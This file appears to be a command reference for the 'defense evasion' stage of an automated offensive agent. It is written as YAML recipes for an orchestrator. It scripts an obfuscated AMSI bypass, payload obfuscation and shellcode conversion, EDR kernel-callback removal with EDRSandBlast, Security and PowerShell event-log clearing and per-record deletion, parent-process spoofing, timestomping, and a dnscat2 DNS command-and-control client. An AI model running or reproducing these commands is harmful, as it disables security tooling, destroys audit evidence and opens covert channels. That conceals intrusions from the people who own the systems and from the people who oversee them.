# Defense Evasion — Tool commands reference

Ambient preflight commands run automatically before every high-risk dispatch.
On-demand commands invoked when the Orchestrator routes to this stage.

Placeholders documented in
[../../discovering-environment/reference/tool-commands.md](../../discovering-environment/reference/tool-commands.md).

## Contents
- Ambient preflight checklist
- amsi-bypass (E1)
- invoke-obfuscation (E7)
- donut / srdi (E6)
- edrsandblast (E5, destructive)
- wevtutil / invoke-phant0m (E11)
- selectmyparent (E8)
- timestomp (E10)
- dnscat2 (E12)

## Ambient preflight checklist

Run before EVERY high-risk tool dispatch. Sets `opsec_state.*` fields used by
ambient policy rules in SKILL.md.

```yaml
ambient_preflight:
  - id: detect_edr
    parser: parsers.edr_signal
    cmd: "Seatbelt.exe AntiVirus Processes -outputformat=json"
    sets: "opsec_state.edr_product"
  - id: amsi_status
    cmd: "powershell -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')\""
    parser: parsers.amsi_probe
    sets: "opsec_state.amsi_bypassed"
  - id: etw_status
    cmd: "powershell -c \"$null -ne (Get-ItemProperty 'HKLM:/Software/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/powershell.exe' -ErrorAction SilentlyContinue).ETW\""
    parser: parsers.etw_probe
    sets: "opsec_state.etw_patched"
```

## `amsi-bypass`  (E1)

```yaml
tool: amsi-bypass
opsec: stealth
commands:
  - id: amsiutils_patch
    cmd: |
      [Ref].Assembly.GetType('Sys'+'tem.Management.Automation.AmsiUt'+'ils').GetField(
        'amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)
    parser: parsers.amsi_probe
    on_failure:
      fallback: amsiscanbuffer_patch
  - id: amsiscanbuffer_patch
    cmd: "{{ artifact.path }}/AmsiScanBufferBypass.ps1"
    parser: parsers.amsi_probe
```

## `invoke-obfuscation`  (E7, build-time)

```yaml
tool: invoke-obfuscation
opsec: build-time
commands:
  - id: obfuscate_ps
    cmd: "Invoke-Obfuscation -ScriptPath {{ payload.in }} -Command 'TOKEN,ALL,1' -Quiet -OutputFile {{ payload.out }}"
    parser: parsers.file_artifact
```

## `donut` / `srdi`  (E6, build-time)

```yaml
tool: donut
opsec: build-time
commands:
  - id: pe_to_shellcode
    cmd: "donut -i {{ payload.in }} -o {{ payload.out }}.bin -f 1 -b 3"
    parser: parsers.file_artifact

tool: srdi
opsec: build-time
commands:
  - id: dll_to_shellcode
    cmd: "python ShellcodeRDI.py -f {{ payload.in }} -o {{ payload.out }}.bin"
    parser: parsers.file_artifact
```

## `edrsandblast`  (E5 — destructive, last resort)

```yaml
tool: edrsandblast
opsec: loud
destructive_gate: true
preconditions:
  - "opsec_state.edr_blocking_dump == true"
  - "host.current.access_level == 'system'"
commands:
  - id: kill_callbacks
    cmd: "EDRSandBlast.exe --kernelmode -v"
    parser: parsers.edrsandblast
    cleanup_cmd: "EDRSandBlast.exe --kernelmode --restore -v"
```

## `wevtutil` / `Invoke-Phant0m`  (E11)

```yaml
tool: wevtutil
opsec: loud
destructive_gate: true
notes: "Targeted clearing leaves Event 1102 (Audit Log Cleared) — defenders SEE this. Prefer per-record drop via Invoke-Phant0m."
commands:
  - id: clear_security
    cmd: "wevtutil cl Security"
    parser: parsers.wevtutil
  - id: clear_ps_operational
    cmd: 'wevtutil cl "Microsoft-Windows-PowerShell/Operational"'
    parser: parsers.wevtutil

tool: invoke-phant0m
opsec: stealth
destructive_gate: true
commands:
  - id: drop_events
    cmd: 'Invoke-Phant0m -EventLog "Security" -EventIdList "{{ events.ids_csv }}"'
    parser: parsers.phant0m
```

## `selectmyparent`  (E8)

```yaml
tool: selectmyparent
opsec: stealth
commands:
  - id: spawn_under
    cmd: "SelectMyParent.exe {{ payload.exe }} {{ spoof.parent_pid }}"
    parser: parsers.process_whoami
```

## `timestomp`  (E10, post-action)

```yaml
tool: timestomp
opsec: stealth
commands:
  - id: copy_mac
    cmd: |
      $r = Get-Item '{{ stomp.reference_path }}'; $t = Get-Item '{{ stomp.target_path }}'
      $t.CreationTime = $r.CreationTime; $t.LastWriteTime = $r.LastWriteTime; $t.LastAccessTime = $r.LastAccessTime
    parser: parsers.timestomp
```

## `dnscat2`  (E12, engagement-setup)

```yaml
tool: dnscat2
opsec: stealth
preconditions: ["context.c2.dns_domain is not null"]
commands:
  - id: client_connect
    cmd: "dnscat2-client --dns server={{ context.c2.dns_server }},domain={{ context.c2.dns_domain }}"
    parser: parsers.dnscat_session
```
